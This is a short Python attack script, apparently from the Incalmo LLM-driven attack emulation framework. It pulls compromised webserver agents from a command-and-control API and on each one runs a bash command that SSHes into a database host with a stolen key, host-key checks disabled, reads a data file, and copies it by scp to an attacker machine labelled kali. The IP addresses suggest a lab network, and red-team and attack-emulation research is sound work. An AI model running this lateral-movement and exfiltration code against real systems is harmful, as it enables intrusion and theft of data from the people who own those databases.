    from incalmo.core.actions.LowLevel.run_bash_command import RunBashCommand
    
    c2api = environment_state_service.c2api_client
    
    # Map of webserver agents to their corresponding database IPs and files
    webserver_db_map = [
        ('e08ac956', '192.168.201.50', 'data_database_0.json'),
        ('b96c3a9e', '192.168.201.51', 'data_database_1.json'),
        ('77a6d966', '192.168.201.52', 'data_database_2.json'),
        ('e62cf157', '192.168.201.53', 'data_database_3.json'),
        ('890c197d', '192.168.201.54', 'data_database_4.json'),
        ('bf4475a9', '192.168.201.55', 'data_database_5.json'),
        ('e015578d', '192.168.201.56', 'data_database_6.json'),
        ('624ca360', '192.168.201.57', 'data_database_7.json'),
        ('12008ca5', '192.168.201.58', 'data_database_8.json'),
        ('98b61c6f', '192.168.201.59', 'data_database_9.json'),
        ('9f5f9b0a', '192.168.201.60', 'data_database_10.json'),
        ('37663995', '192.168.201.61', 'data_database_11.json'),
        ('4e3f23d7', '192.168.201.62', 'data_database_12.json'),
        ('97450bf9', '192.168.201.63', 'data_database_13.json'),
        ('a884f163', '192.168.201.64', 'data_database_14.json'),
    ]
    
    results = []
    for paw, db_ip, filename in webserver_db_map:
        agent = c2api.get_agent(paw)
        if agent:
            # SSH from webserver to database and SCP file to kali
            cmd = RunBashCommand(agent, f'ssh -o StrictHostKeyChecking=no -i ~/.ssh/id_ed25519 ubuntu@{db_ip} "cat /home/ubuntu/{filename}" > /tmp/{filename} && scp -o StrictHostKeyChecking=no /tmp/{filename} root@192.168.202.100:/tmp/{filename} 2>&1')
            result = c2api.send_command(cmd)
            results.append(f"{filename}: exit:{result.exit_code}")
    
    return results

